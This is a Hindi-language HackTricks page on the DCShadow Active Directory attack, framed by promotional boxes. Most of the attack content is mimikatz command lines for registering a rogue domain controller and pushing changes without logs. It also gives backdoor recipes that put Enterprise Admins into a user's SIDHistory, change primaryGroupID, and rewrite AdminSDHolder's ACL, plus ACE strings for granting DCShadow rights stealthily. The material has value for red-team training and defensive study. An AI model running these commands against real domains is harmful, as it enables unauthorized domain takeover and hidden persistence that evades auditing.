<details>

<summary><strong>AWS हैकिंग सीखें शून्य से नायक तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>


# DCShadow

यह AD में **नया Domain Controller** रजिस्टर करता है और इसका उपयोग करके निर्दिष्ट ऑब्जेक्ट्स पर एट्रिब्यूट्स (SIDHistory, SPNs...) को **पुश** करता है **बिना** किसी **लॉग्स** के जो **मॉडिफिकेशन्स** के बारे में बताएं। आपको **DA** विशेषाधिकारों की आवश्यकता है और **रूट डोमेन** के अंदर होना चाहिए।\
ध्यान दें कि यदि आप गलत डेटा का उपयोग करते हैं, तो काफी बदसूरत लॉग्स दिखाई देंगे।

हमला करने के लिए आपको 2 mimikatz इंस्टेंस की आवश्यकता है। उनमें से एक RPC सर्वर्स को SYSTEM विशेषाधिकारों के साथ शुरू करेगा (आपको यहां परिवर्तन इंगित करने होंगे जो आप करना चाहते हैं), और दूसरा इंस्टेंस मानों को पुश करने के लिए उपयोग किया जाएगा:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - DA या इसी तरह की आवश्यकता होती है" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

ध्यान दें कि **`elevate::token`** mimikatz1 सत्र में काम नहीं करेगा क्योंकि इससे थ्रेड के विशेषाधिकार बढ़ गए हैं, लेकिन हमें **प्रक्रिया के विशेषाधिकार** बढ़ाने की आवश्यकता है।\
आप "LDAP" ऑब्जेक्ट भी चुन सकते हैं: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

आप निम्नलिखित न्यूनतम अनुमतियों वाले DA या उपयोगकर्ता से परिवर्तन पुश कर सकते हैं:

* **डोमेन ऑब्जेक्ट** में:
* _DS-Install-Replica_ (डोमेन में रेप्लिका जोड़ें/हटाएं)
* _DS-Replication-Manage-Topology_ (रेप्लिकेशन टोपोलॉजी प्रबंधन)
* _DS-Replication-Synchronize_ (रेप्लिकेशन सिंक्रोनाइज़ेशन)
* **कॉन्फ़िगरेशन कंटेनर** में **साइट्स ऑब्जेक्ट** (और इसके बच्चे):
* _CreateChild और DeleteChild_
* **कंप्यूटर का ऑब्जेक्ट जो DC के रूप में पंजीकृत है**:
* _WriteProperty_ (Write नहीं)
* **लक्ष्य ऑब्जेक्ट**:
* _WriteProperty_ (Write नहीं)

आप [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) का उपयोग करके एक अनाधिकृत उपयोगकर्ता को ये विशेषाधिकार दे सकते हैं (ध्यान दें कि इससे कुछ लॉग छोड़े जाएंगे)। यह DA विशेषाधिकार होने से कहीं अधिक प्रतिबंधात्मक है।\
उदाहरण के लिए: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  इसका मतलब है कि उपयोगकर्ता नाम _**student1**_ जब मशीन _**mcorp-student1**_ में लॉग इन होता है, तो उसे ऑब्जेक्ट _**root1user**_ पर DCShadow विशेषाधिकार होते हैं।

## DCShadow का उपयोग करके बैकडोर बनाना

{% code title="एक उपयोगकर्ता के SIDHistory में Enterprise Admins सेट करना" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="PrimaryGroupID बदलें (उपयोगकर्ता को Domain Administrators का सदस्य बनाएं)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolder के ntSecurityDescriptor को संशोधित करें (एक उपयोगकर्ता को पूर्ण नियंत्रण दें)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow का उपयोग करके DCShadow अनुमतियाँ दें (संशोधित अनुमतियों के लॉग नहीं)

हमें निम्नलिखित ACEs को हमारे उपयोगकर्ता के SID के साथ अंत में जोड़ना होगा:

* डोमेन ऑब्जेक्ट पर:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* हमलावर कंप्यूटर ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
* लक्षित उपयोगकर्ता ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
* कॉन्फ़िगरेशन कंटेनर में साइट्स ऑब्जेक्ट पर: `(A;CI;CCDC;;;UserSID)`

किसी ऑब्जेक्ट के वर्तमान ACE प्राप्त करने के लिए: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

ध्यान दें कि इस मामले में आपको केवल एक नहीं, **कई परिवर्तन** करने होंगे। इसलिए, **mimikatz1 सत्र** (RPC सर्वर) में आप जो भी परिवर्तन करना चाहते हैं, उसके साथ पैरामीटर **`/stack` का उपयोग करें।** इस तरह, आपको केवल एक बार **`/push`** करने की आवश्यकता होगी ताकि रूज सर्वर में सभी अटके हुए परिवर्तनों को प्रदर्शित किया जा सके।



[**DCShadow के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>AWS हैकिंग सीखें शून्य से नायक तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का अनुसरण करें।**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
